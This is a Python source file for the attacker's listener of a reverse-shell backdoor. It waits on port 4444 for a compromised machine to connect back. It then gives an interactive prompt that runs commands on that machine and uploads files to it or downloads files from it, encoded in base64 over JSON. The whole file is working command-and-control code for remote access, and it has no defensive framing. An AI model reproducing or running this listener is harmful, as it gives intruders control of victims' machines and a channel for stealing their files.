#! /usr/bin/env python
import socket
import json
import base64
class Listener:
   def __init__(self, ip, port):
      listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      listener.bind((ip, port))
      listener.listen(0)
      print("Waiting for incoming connnections.....")
      self.connection, address = listener.accept()
      print("Connection received " + str(address))

   def rel_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

   def rel_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

   def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

   def write_File(self, path, content):
        with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return("{*} Download successful!!")
        
   def exec_remotely(self, command):
        self.rel_send(command)
        if command[0] == "exit":
                self.connection.close()
                exit()

        return self.rel_receive()

   def run(self):
      while True:
        command = input(">> ")
        command = command.split(" ")
        try:
           if command[0] == "upload":
                file_con = self.read_file(command[1])
                command.append(file_con)
           result =  self.exec_remotely(command)
           if command[0] == "download" and "{Error}" not in result:
                result = self.write_File(command[1], result)
        except Exception:
                result = "{+} error during command execution bish"
        print(result)

myListener = Listener("<IP>", 4444)
myListener.run()
